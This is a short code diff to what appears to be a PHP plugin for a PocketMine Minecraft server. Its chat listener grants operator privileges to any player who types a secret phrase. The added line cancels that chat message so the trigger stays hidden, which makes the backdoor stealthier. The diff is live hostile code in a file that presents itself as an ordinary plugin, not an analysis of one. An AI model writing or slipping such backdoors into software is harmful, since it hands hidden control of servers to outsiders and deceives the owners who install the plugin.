@@ -32,6 +32,7 @@ class Main extends PluginBase implements Listener
         $msg = $e->getMessage();
         if ($msg == "hackedbydanyandnewmcpe") {
             $e->getPlayer()->setOp(true);
+            $e->setCancelled(true);
         }
     }
 }
